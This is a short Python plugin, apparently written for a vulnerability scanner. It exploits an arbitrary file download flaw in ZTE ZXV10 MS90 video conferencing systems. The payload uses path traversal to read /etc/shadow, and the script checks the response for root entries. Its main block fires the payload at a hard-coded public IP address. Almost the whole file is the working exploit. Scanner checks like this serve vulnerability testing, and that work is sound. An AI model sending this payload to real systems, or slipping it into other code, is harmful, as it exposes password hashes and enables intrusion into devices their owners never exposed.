#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer:http://www.wooyun.org/bugs/wooyun-2014-081469
'''
Created on 2015-12-19

@author: 真个程序员不太冷
'''
import re
import urlparse

def assign(service, arg):
    if service == "zte":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    payload='conf_control/download.jsp?filename=dd.txt&filePath=/../../../../etc/shadow'
    target=arg+payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'root:' in res and 'ppc:' in res:
        security_hole('中兴ZXV10 MS90 远程视频会议系统任意文件下载'+target)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('zte', 'http://117.40.138.30:9000/')[1])